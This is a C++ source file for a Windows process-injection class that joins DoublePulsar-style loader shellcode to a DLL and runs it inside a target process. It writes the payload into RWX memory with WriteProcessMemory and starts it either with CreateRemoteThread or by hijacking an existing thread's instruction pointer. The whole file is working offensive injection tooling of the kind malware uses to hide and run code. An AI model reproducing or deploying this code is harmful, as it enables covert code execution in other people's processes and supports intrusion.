#include "InjectionManualMap.h"

InjectionManualMap::InjectionManualMap(DWORD pid, std::string dllPath, bool useCRT) :
	InjectionBase(pid), dllPath(dllPath), useCRT(useCRT) {}

InjectionManualMap::InjectionManualMap(DWORD pid, std::vector<unsigned char> buffer, bool useCRT) :
	InjectionBase(pid), buffer(buffer), useCRT(useCRT) {}

std::vector<unsigned char> InjectionManualMap::ConstructPayload(std::vector<unsigned char> dllBytes)
{
	int dllSize = dllBytes.size();
	uint64_t payloadSize = sizeof(doublePulsarPayload) + dllBytes.size();
	unsigned char* payload = (unsigned char*)malloc(payloadSize);

	if (payload == nullptr) { return {}; }

	// Edit shellcode to include dll size
	memcpy(&doublePulsarPayload[0xF82], &dllSize, sizeof(dllSize));

	// Put it all together, shellcode + DLL into the final buffer
	memcpy(payload, doublePulsarPayload, sizeof(doublePulsarPayload));
	memcpy(payload + sizeof(doublePulsarPayload), dllBytes.data(), dllSize);

	return std::vector<unsigned char>(payload, payload + payloadSize);
}

bool InjectionManualMap::InjectHelper(std::vector<unsigned char> payload)
{
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	if (proc == NULL)
	{
		printf("Error opening target process handle\n");
		return false;
	}

	LPVOID procMem = VirtualAllocEx(proc, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (procMem == NULL)
	{
		printf("Error allocating memory in target process\n");
		return false;
	}

	bool wpmResult = WriteProcessMemory(proc, procMem, payload.data(), payload.size(), NULL);
	if (!wpmResult)
	{
		printf("Error writing to target process memory\n");
		return false;
	}

	if (useCRT)
	{
		SECURITY_ATTRIBUTES secAttr;
		secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		secAttr.bInheritHandle = FALSE;
		secAttr.lpSecurityDescriptor = NULL;
		HANDLE result = CreateRemoteThread(proc, &secAttr, 0, (LPTHREAD_START_ROUTINE)procMem, NULL, 0, NULL);
		return result ? true : false;
	}
	else
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

		// iterate over all threads in the target process
		THREADENTRY32 threadEntry;
		threadEntry.dwSize = sizeof(THREADENTRY32);

		bool success = Thread32First(snapshot, &threadEntry);
		while (success)
		{
			success = Thread32Next(snapshot, &threadEntry);
			if (success)
			{
				if (threadEntry.th32OwnerProcessID == targetPID)
				{
					DWORD threadId = threadEntry.th32ThreadID;
					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, threadId);

					CONTEXT ctx;
					ctx.ContextFlags = CONTEXT_FULL;

					DWORD success = SuspendThread(hThread);
					if (success == -1)
					{
						CloseHandle(hThread);
						continue;
					}

					GetThreadContext(hThread, &ctx);
#ifdef _WIN64
					ctx.Rip = (DWORD_PTR)procMem;
#else
					ctx.Eip = (DWORD_PTR)procMem;
#endif

					SetThreadContext(hThread, &ctx);
					ResumeThread(hThread);

					CloseHandle(hThread);
					break;
				}
			}
		}

		CloseHandle(snapshot);
		CloseHandle(proc);

		return true;
	}
}

bool InjectionManualMap::InjectWithBuffer()
{
	std::vector<unsigned char> payloadObj = ConstructPayload(buffer);
	return InjectHelper(payloadObj);
}

bool InjectionManualMap::InjectWithFile()
{
	std::vector<unsigned char> fileBytes = GetBytesFromFile(dllPath);
	std::vector<unsigned char> payloadVector = ConstructPayload(fileBytes);
	return InjectHelper(payloadVector);
}

bool InjectionManualMap::Inject()
{
	if (dllPath.empty())
		return InjectWithBuffer();
	else
		return InjectWithFile();
}